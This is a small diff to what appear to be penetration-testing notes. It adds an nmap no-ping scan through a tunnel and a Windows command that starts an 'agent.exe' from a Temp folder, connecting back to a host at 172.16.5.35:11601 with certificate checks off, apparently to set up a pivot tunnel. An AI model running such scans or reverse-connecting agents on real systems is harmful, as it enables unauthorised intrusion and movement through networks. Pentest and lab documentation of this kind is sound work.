@@ -120,4 +120,8 @@ Bash
 ```
 # Test the tunnel with a no-ping scan
 nmap -Pn -p 22 172.16.119.10
-```p
+```
+
+```
+C:\Users\mlefay\AppData\Local\Temp\agent.exe -connect 172.16.5.35:11601 -ignore-cert
+```
